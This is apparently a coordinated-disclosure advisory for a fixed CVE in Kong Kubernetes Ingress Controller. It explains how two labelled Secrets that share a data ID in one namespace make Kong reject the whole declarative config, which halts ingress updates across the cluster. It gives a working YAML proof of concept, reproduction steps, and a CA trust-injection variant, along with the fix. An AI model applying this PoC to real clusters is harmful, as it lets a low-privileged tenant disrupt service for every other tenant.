# CVE-2026-15228: Cluster-wide config-sync DoS in Kong Kubernetes Ingress Controller via a labeled namespaced Secret

**Published:** 2026-07-29 **Reported:** 2026-06-07 **Severity:** 8.5 High **Status:** Fixed in Kong Kubernetes Ingress Controller 3.4.18 and 3.5.11 (GHSA-g9h6-h2xj-mf78) **CWEs:** CWE-862 (Missing Authorization) + CWE-400 (Uncontrolled Resource Consumption) + CWE-295 (Improper Certificate Validation)

---

Kong Kubernetes Ingress Controller (KIC) collects CA certificates from Secrets and ConfigMaps by a label only, with no namespace and no ingress-class restriction, and it uses an attacker-controlled field of the Secret as the Kong CA-certificate primary key. A user who can only create Secrets in their own namespace can write into the cluster-global Kong CA-certificate pool. By colliding the primary key across two of their own Secrets, they make Kong reject KIC's entire declarative config, which stalls ingress config propagation for every tenant in the cluster until an operator hunts down the offending Secret.

---

## The bug

`internal/store/store.go` `ListCACerts` lists every CA-cert Secret and ConfigMap in the cluster, gated only by the label `konghq.com/ca-cert=true`:

```go
// ListCACerts returns all Secrets and ConfigMaps containing the label "konghq.com/ca-cert"="true".
func (s Store) ListCACerts() ([]*corev1.Secret, []*corev1.ConfigMap, error) {
    req, err := labels.NewRequirement(caCertKey, selection.Equals, []string{"true"})
    ...
    err = cache.ListAll(s.stores.Secret, labels.NewSelector().Add(*req), func(ob any) {
        if p, ok := ob.(*corev1.Secret); ok { secrets = append(secrets, p) }
    })
    ...
}
```

There is no `isValidIngressClass` filter here (contrast `ListKongVaults` and most other `List*` methods in the same file, which do filter by ingress class), and no namespace scoping. Any Secret in any namespace with the label is picked up cluster-wide.

The translator then takes the Kong CA-certificate ID straight from the Secret's `data["id"]`:

```go
// internal/dataplane/translator/translate_cacerts.go
secretID, ok := caCertData.data["id"]      // attacker-controlled
...
caCert, err := toKongCACertificate([]byte(caCertStr), caCertData.obj, secretID)
...
return kong.CACertificate{ ID: secretID, Cert: string(caCertBytes), ... }
```

`deckgen/generate.go` performs no de-duplication or conflict detection across CA-cert IDs. Two CA-cert Secrets with the same `data["id"]` therefore produce two `ca_certificates` entries with the same primary key in the declarative config KIC pushes to Kong.

Two decisions on their own are defensible: labels are a normal Kubernetes selector; taking an ID from the Secret data avoids collisions when the operator wants a specific one. Together, without ingress-class filtering, namespace scoping, or an ID-conflict detector, they become a single-Secret cluster-wide primitive.

Where the bug lives:

- `internal/store/store.go` (`ListCACerts`, label-only, cluster-wide, no class or namespace filter)
- `internal/dataplane/translator/translate_cacerts.go` (Kong CA-cert ID = attacker `data["id"]`)
- `internal/dataplane/deckgen/generate.go` (no CA-cert ID conflict detection)

## PoC

An attacker with `create secret` in their own namespace applies two Secrets:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: x1
  namespace: attacker
  labels:
    konghq.com/ca-cert: "true"
data:
  id: "MTExMTExMTEtMTExMS0xMTExLTExMTEtMTExMTExMTExMTEx"
  cert: "<attacker CA b64>"
---
apiVersion: v1
kind: Secret
metadata:
  name: x2
  namespace: attacker
  labels:
    konghq.com/ca-cert: "true"
data:
  id: "MTExMTExMTEtMTExMS0xMTExLTExMTEtMTExMTExMTExMTEx"
  cert: "<another CA b64>"
```

KIC ingests both cluster-wide and emits a declarative config with two `ca_certificates` sharing one ID. Pushing that config to Kong (DB-less `/config`, the mode KIC uses) is rejected, and Kong rejects the whole document, not just the offending entity:

```
$ curl -s -X POST :8001/config -F config=@dup.json -w '[HTTP %{http_code}]'
{"fields":{"ca_certificates":[null,"uniqueness violation: 'ca_certificates' entity with primary key set to '1111...1111' already declared"]},"code":14,"name":"invalid declarative configuration"}
[HTTP 400]
```

Because KIC pushes its configuration atomically, this rejection means none of the cluster's routes, services, plugins, or consumer changes are applied until the offending Secret is deleted. A single namespaced tenant wedges ingress config propagation for the entire cluster. The attacker controls both Secrets, so the primary-key collision is guaranteed without needing to know any other tenant's IDs.

Reproduction steps:

1. As a user with `create secret` in any one namespace, create two Secrets labeled `konghq.com/ca-cert: "true"` with the same `data.id` and valid CA certs.
2. KIC builds a declarative config with a duplicate `ca_certificates` id and pushes it.
3. Kong returns 400 and the entire config push fails; cluster-wide ingress config is now frozen.

## Impact

A tenant who can only create Secrets in their own namespace reaches across the whole cluster. KIC ingests their CA-cert Secret regardless of namespace or ingress class, and a primary-key collision they fully control makes Kong reject KIC's entire config document. The result is a cluster-wide ingress config-sync outage: every other tenant's route, service, plugin, and consumer changes stop applying, triggered by one low-privileged Secret and persisting until an operator manually finds and deletes it.

Secondary impact (trust injection): with a unique ID rather than a colliding one, the attacker's CA certificate is accepted and added to Kong's cluster-global CA pool. Any plugin (for example `mtls-auth`) that references that CA-certificate ID would then trust the attacker's CA, enabling client-certificate forgery against that route.

**CVSS 3.1:** 8.5 High, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H`. The base credits the proven cluster-wide config-sync DoS (`A:H`) plus config-integrity tampering (`I:L`). The trust-injection path is conditional on a victim plugin referencing the injected CA-cert ID and is not credited in the base.

## Fix

Scope and key the CA-cert pool safely:

- In `ListCACerts`, apply the same ingress-class filtering used by the other `List*` methods, and consider restricting which namespaces may contribute cluster-global CA certs (or require a cluster-scoped resource for cluster-global trust material).
- Derive the Kong CA-certificate ID from the Secret's server-assigned identity (`secret.UID` / namespaced name), exactly as TLS certificates are keyed in `translate_certs.go`, instead of trusting `data["id"]`.
- In `deckgen`, detect CA-cert ID conflicts and drop/skip the offending entity with a translation failure on that object, rather than emitting a duplicate that fails the whole push. KIC already has a credential conflict detector to model this on.

Fixed in Kong Kubernetes Ingress Controller 3.4.18 and 3.5.11.

## Disclosure

Reported privately to Kong via GitHub's private vulnerability reporting on 2026-06-07 against `master` HEAD `e0d7b00`. CVE-2026-15228 assigned, GHSA-g9h6-h2xj-mf78 published 2026-07-29.

Thanks to the Kong team for the triage and coordination.

## Links

- Advisory: https://github.com/Kong/kubernetes-ingress-controller/security/advisories/GHSA-g9h6-h2xj-mf78
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-15228
- Kong Kubernetes Ingress Controller: https://github.com/Kong/kubernetes-ingress-controller
- Kong DB-less declarative config: https://docs.konghq.com/gateway/latest/production/deployment-topologies/db-less-and-declarative-config/
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
- CWE-295: https://cwe.mitre.org/data/definitions/295.html
